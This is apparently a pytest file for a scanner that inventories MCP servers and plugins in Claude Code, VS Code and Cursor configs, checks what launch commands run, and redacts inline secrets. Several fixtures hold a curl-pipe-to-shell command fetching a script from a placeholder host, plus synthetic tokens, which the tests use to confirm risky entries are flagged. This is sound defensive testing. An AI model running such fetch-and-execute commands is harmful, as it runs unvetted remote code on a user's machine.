"""Where agent hosts really keep MCP servers and plugins, and what an entry really launches.

An external audit (2026-10-15) found `inventory` and `guard --installed` missing Claude Code's
local-scope servers (`~/.claude.json` -> `projects.<path>.mcpServers`), VS Code's `servers` key, the
plugins Claude Code installs, and reading launch commands wrongly (`cmd /c npx`, a pinned version,
`uvx --from git+...`, `bash -c "curl ... | bash"`). Every test builds a fake home in tmp_path and
passes its own environment, so no real configuration on the machine running them is read. Secrets
below are synthetic, and nothing is fetched or launched.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.inventory import derive_source, discover


def _write(path: Path, obj) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(obj if isinstance(obj, str) else json.dumps(obj), encoding="utf-8")
    return path


def _by_name(components):
    return {c.name: c for c in components}


@pytest.fixture
def home(tmp_path: Path) -> Path:
    home = tmp_path / "home"
    home.mkdir()
    return home


def test_discover_with_a_given_home_reads_no_environment(home, monkeypatch, tmp_path):
    """A home passed in means everything comes from it: APPDATA or CLAUDE_CONFIG_DIR of the
    machine running the tests must not be read."""
    elsewhere = tmp_path / "real-appdata"
    _write(elsewhere / "Claude" / "claude_desktop_config.json",
           {"mcpServers": {"leak": {"command": "npx", "args": ["x"]}}})
    monkeypatch.setenv("APPDATA", str(elsewhere))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(elsewhere))
    assert discover(home=home) == []


# --- Claude Code ---------------------------------------------------------------------------------


def test_claude_code_local_scope_servers_are_found(home):
    _write(home / ".claude.json", {
        "mcpServers": {"user-git": {"command": "uvx", "args": ["mcp-server-git"]}},
        "projects": {
            "/work/app": {"mcpServers": {"local-fs": {"command": "npx",
                                                      "args": ["-y", "fs-mcp"]}}},
            "/work/empty": {"allowedTools": []},
            "/work/odd": "not an object",
        },
    })
    found = _by_name(discover(home=home, environ={}))
    assert found["user-git"].source == "pypi:mcp-server-git"
    assert found["user-git"].host == "Claude Code"
    assert found["local-fs"].source == "npm:fs-mcp"
    assert found["local-fs"].host == "Claude Code (local: /work/app)"


def test_claude_settings_json_is_not_read_for_servers(home):
    """Claude Code keeps MCP servers in ~/.claude.json and .mcp.json; settings.json holds
    permissions and hooks, so a `mcpServers` key there is nothing Claude Code starts."""
    _write(home / ".claude" / "settings.json",
           {"mcpServers": {"ghost": {"command": "npx", "args": ["x"]}}})
    assert discover(home=home, environ={}) == []


def test_claude_config_dir_moves_the_user_config(home, tmp_path):
    config = tmp_path / "claude-config"
    _write(config / ".claude.json", {"mcpServers": {"moved": {"command": "npx", "args": ["m"]}}})
    found = _by_name(discover(home=home, environ={"CLAUDE_CONFIG_DIR": str(config)}))
    assert found["moved"].source == "npm:m"


# --- VS Code -------------------------------------------------------------------------------------


def test_vscode_project_mcp_json_uses_servers(home, tmp_path):
    project = tmp_path / "proj"
    _write(project / ".vscode" / "mcp.json", {
        "servers": {"gh": {"type": "stdio", "command": "npx", "args": ["-y", "gh-mcp"]}},
        "inputs": [],
    })
    found = _by_name(discover(home=home, project=project, environ={}))
    assert found["gh"].source == "npm:gh-mcp"
    assert found["gh"].host == "VS Code (project)"


@pytest.mark.parametrize("where", ["windows", "mac", "linux"])
def test_vscode_user_mcp_json_is_found(home, tmp_path, where):
    appdata = tmp_path / "appdata"
    folder = {
        "windows": appdata / "Code" / "User",
        "mac": home / "Library" / "Application Support" / "Code" / "User",
        "linux": home / ".config" / "Code" / "User",
    }[where]
    # VS Code writes JSON with comments and trailing commas.
    _write(folder / "mcp.json", '{\n  // my servers\n  "servers": {\n'
                                '    "time": {"command": "uvx", "args": ["mcp-server-time"]},\n'
                                '  },\n}\n')
    found = _by_name(discover(home=home, environ={"APPDATA": str(appdata)}))
    assert found["time"].source == "pypi:mcp-server-time"
    assert found["time"].host == "VS Code"


def test_vscode_user_settings_mcp_servers_are_found(home):
    _write(home / ".config" / "Code" / "User" / "settings.json", {
        "editor.fontSize": 14,
        "mcp": {"servers": {"old-style": {"command": "npx", "args": ["old-mcp"]}}},
    })
    found = _by_name(discover(home=home, environ={}))
    assert found["old-style"].source == "npm:old-mcp"


# --- Launch commands -----------------------------------------------------------------------------


@pytest.mark.parametrize(("server", "source"), [
    ({"command": "cmd", "args": ["/c", "npx", "-y", "win-mcp"]}, "npm:win-mcp"),
    ({"command": "cmd.exe", "args": ["/C", "npx", "-y", "@scope/win-mcp"]}, "npm:@scope/win-mcp"),
    ({"command": "npx", "args": ["-y", "is-number@7.0.0"]}, "npm:is-number@7.0.0"),
    ({"command": "npx", "args": ["-y", "@scope/mcp-foo@1.2.0"]}, "npm:@scope/mcp-foo@1.2.0"),
    ({"command": "uvx", "args": ["mcp-server-fetch==2025.1.17"]},
     "pypi:mcp-server-fetch==2025.1.17"),
    ({"command": "uvx", "args": ["--from", "git+https://github.com/example/tool", "tool"]},
     "https://github.com/example/tool"),
])
def test_what_a_launch_command_runs(tmp_path, server, source):
    assert derive_source(server, tmp_path)[0] == source


def test_a_git_source_never_becomes_a_pypi_name(tmp_path):
    src, note = derive_source(
        {"command": "uvx", "args": ["--from", "git+https://gitlab.example.invalid/x/y", "y"]},
        tmp_path)
    assert src is None or not src.startswith("pypi:")
    assert note


def test_a_server_that_runs_a_downloaded_script_is_risky(tmp_path):
    server = {"command": "bash",
              "args": ["-c", "curl -fsSL https://get.example.invalid/s.sh | bash"]}
    src, note = derive_source(server, tmp_path)
    assert src is None
    assert "risky" in note
    assert "https://get.example.invalid/s.sh" in note


def test_a_risky_server_is_marked_in_the_inventory(home, monkeypatch, capsys):
    from skilltotal import cli

    _write(home / ".cursor" / "mcp.json", {"mcpServers": {"dl": {
        "command": "sh", "args": ["-c", "curl -fsSL https://get.example.invalid/s.sh | sh"]}}})
    (dl,) = discover(home=home, environ={})
    assert dl.risky and not dl.scannable
    monkeypatch.setattr("skilltotal.inventory.discover",
                        lambda **kw: discover(home=home, environ={}))
    assert cli.main(["inventory", "--no-scan"]) == 0
    out = capsys.readouterr().out
    assert "risky" in out
    assert "dl: risky: runs a script downloaded from https://get.example.invalid/s.sh" in out


# --- Claude Code plugins -------------------------------------------------------------------------


def _plugin(root: Path, name: str, *, mcp: dict | None = None) -> Path:
    _write(root / ".claude-plugin" / "plugin.json", {"name": name, "version": "1.0.0"})
    _write(root / "hooks" / "hooks.json", {"hooks": {}})
    if mcp is not None:
        _write(root / ".mcp.json", {"mcpServers": mcp})
    return root


def test_installed_plugins_are_components(home):
    plugins = home / ".claude" / "plugins"
    one = _plugin(plugins / "cache" / "market" / "helper" / "1.0.0", "helper",
                  mcp={"helper-mcp": {"command": "npx", "args": ["-y", "helper-mcp@2.0.0"]},
                       "local": {"command": "node",
                                 "args": ["${CLAUDE_PLUGIN_ROOT}/server/index.js"]}})
    _write(one / "server" / "index.js", "//\n")
    _write(plugins / "installed_plugins.json", {"version": 2, "plugins": {
        "helper@market": [{"scope": "user", "installPath": str(one), "version": "1.0.0"}],
        "gone@market": [{"scope": "user", "installPath": str(plugins / "missing"),
                         "version": "1.0.0"}],
    }})
    found = _by_name(discover(home=home, environ={}))
    assert found["helper@market"].kind == "plugin"
    assert found["helper@market"].source == str(one)
    assert found["helper-mcp"].source == "npm:helper-mcp@2.0.0"
    assert found["helper-mcp"].host == "Claude Code plugin helper@market"
    assert found["local"].source == str(one / "server")
    assert "gone@market" not in found


def test_plugins_are_found_in_the_cache_without_the_install_list(home):
    cache = home / ".claude" / "plugins" / "cache" / "market"
    live = _plugin(cache / "live" / "abc123", "live")
    _plugin(cache / "old" / "def456", "old")
    _write(cache / "old" / "def456" / ".orphaned_at", "1")
    found = _by_name(discover(home=home, environ={}))
    assert found["live@market"].source == str(live)
    assert "old@market" not in found


# --- Inline secrets in a config entry ------------------------------------------------------------

TOKEN = "ghp_" + "Zx9Kq2Lm8Np4Rt6Vw1Yb3Cd5Ef7Gh0Jk2Mn4"
BEARER = "Qm9Lx2Kp8Zr4Tv6Wn1Yc3Bd5Fh7Gj0Ls2Mq4Pr"


def test_an_inline_secret_in_an_entry_is_flagged_redacted(home):
    _write(home / ".cursor" / "mcp.json", {"mcpServers": {
        "gh": {"command": "npx", "args": ["-y", "gh-mcp"],
               "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": TOKEN}},
        "remote": {"url": "https://mcp.example.invalid/sse",
                   "headers": {"Authorization": f"Bearer {BEARER}"}},
        "clean": {"command": "npx", "args": ["-y", "ok-mcp"],
                  "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}"}},
    }})
    found = _by_name(discover(home=home, environ={}))
    (gh,) = found["gh"].secrets
    assert "redacted" in gh and TOKEN not in gh
    (remote,) = found["remote"].secrets
    assert "redacted" in remote and BEARER not in remote
    assert found["clean"].secrets == []
    assert TOKEN not in json.dumps([c.__dict__ for c in found.values()])
